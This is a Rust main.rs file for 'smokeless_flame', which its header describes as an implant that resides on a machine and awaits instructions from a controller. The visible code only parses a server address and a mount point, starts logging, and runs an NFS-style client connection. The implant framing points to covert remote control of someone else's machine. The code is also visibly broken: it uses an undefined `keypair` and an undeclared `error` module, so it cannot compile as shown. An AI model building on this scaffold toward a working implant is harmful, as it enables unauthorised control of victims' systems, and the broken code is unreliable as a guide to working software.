/* smokeless_flame - implant/src/main.rs
*
*   Purpose: Reside on a machine and await instruction by the controller
*
*
*
*   Author: Mauzy0x00
*   Start Date: 10-14-2025
*
*   File Description: This is the main function of the implant. Supporting functions and loops will be called here
*/

mod client;


use clap::Parser;
use smol::{io, net, prelude::*, Unblock};
use std::path::PathBuf;

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Turn on verbose logging
    #[arg(short, long)]
    verbose: Option<bool>,

    /// Server address
    #[arg(short, long)]
    server: String,

    /// Local mount point
    #[arg(short, long)]
    mount_point: PathBuf,
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();

    // Initialize logger
    if let Some(true) = cli.verbose {
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("debug")).init();
    } else {
        env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
    }

    let Cli {
        verbose,
        server,
        mount_point,
    } = cli;
    {
        log::info!(
            "Starting NFS client, connecting to {} and mounting at {}",
            server,
            mount_point.display()
        );

        // Create and run client
        let mut client = client::NfsClient::new(server, mount_point, keypair)?;

        smol::block_on(async {
            client.connect().await?;

            log::info!("Connected to server. Press Ctrl+C to disconnect.");

            client.run().await?;

            client.disconnect().await?;
            log::info!("Disconnected from server");

            Ok::<(), error::NfsError>(())
        })?;
    }

    Ok(())
}
